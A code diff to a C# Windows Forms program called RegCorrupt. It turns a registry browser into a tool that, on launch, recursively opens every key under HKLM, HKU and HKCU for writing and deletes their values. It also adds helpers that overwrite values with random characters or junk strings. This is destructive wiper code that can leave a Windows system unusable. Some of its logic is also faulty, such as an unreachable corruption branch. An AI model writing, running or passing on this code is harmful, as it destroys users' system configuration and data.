@@ -5,7 +5,11 @@ using System.ComponentModel;
 using System.Data;
 using System.Drawing;
 using System.Linq;
+using System.Security;
+using System.Security.AccessControl;
+using System.Security.Permissions;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
@@ -13,42 +17,71 @@ namespace RegCorrupt
 {
     public partial class Form1 : Form
     {
-        RegistryKey def_path = Registry.LocalMachine;
+        Random rand = new Random(DateTime.Now.Millisecond);
 
         public Form1()
         {
             InitializeComponent();
-            GetFullRegistry();
+            LoadSubKeys(Registry.LocalMachine);
+            LoadSubKeys(Registry.Users);
+            LoadSubKeys(Registry.CurrentUser);
         }
 
-        public void GetFullRegistry()
-        {
-            string[] SubKeys = def_path.GetSubKeyNames();
-
-            foreach (string key in SubKeys)
-            {
-                if (key != "SECURITY")
-                {
-                    TreeNode parent = treeRegistry.Nodes.Add(key);
-                    LoadSubKeys(def_path.OpenSubKey(key), parent);
-                }
-            }
-        }
-
-        public void LoadSubKeys(RegistryKey path, TreeNode parent)
+        public void LoadSubKeys(RegistryKey path)
         {
             foreach(string key in path.GetSubKeyNames())
             {
-                try
-                {
-                    TreeNode newParent = parent.Nodes.Add(key);
-                    LoadSubKeys(path.OpenSubKey(key), newParent);
-                }
-                catch (System.Security.SecurityException)
-                {
-                    break;
-                }
+                try { LoadSubKeys(path.OpenSubKey(key, true)); }
+                catch (Exception) { }
             }
+
+            foreach (string value in path.GetValueNames())
+            {
+                if (value != null)
+                    path.DeleteValue(value);
+                else
+                    CorruptValue(path, value);
+            }
+        }
+
+        public void CorruptValue(RegistryKey path, string value)
+        {
+            switch (path.GetValueKind(value))
+            {
+                case RegistryValueKind.Binary: path.SetValue(value, CorruptBinary(value)); break;
+                case RegistryValueKind.String: path.SetValue(value, CorruptTypeString()); break;
+                case RegistryValueKind.DWord:
+                case RegistryValueKind.QWord: path.SetValue(value, CorruptDQWord()); break;
+                case RegistryValueKind.MultiString:
+                    for (int i = 0; i < 5; i++)
+                        path.SetValue(value, CorruptTypeString());
+                    break;
+            }
+        }
+
+        public string CorruptTypeString()
+        {
+            string corrupted = "";
+            corrupted += (char)rand.Next(32, 127);
+
+            return corrupted;
+        }
+
+        public byte[] CorruptBinary(string value)
+        {
+            byte[] arr = new byte[value.Length];
+
+            for(int i = 0; i < value.Length; i++)
+            {
+                arr[i] = (byte)rand.Next(32, 127);
+            }
+
+            return arr;
+        }
+
+        public string CorruptDQWord()
+        {
+            return "/!@$!@#!@%!%%!?@?!@%!@";
         }
     }
 }
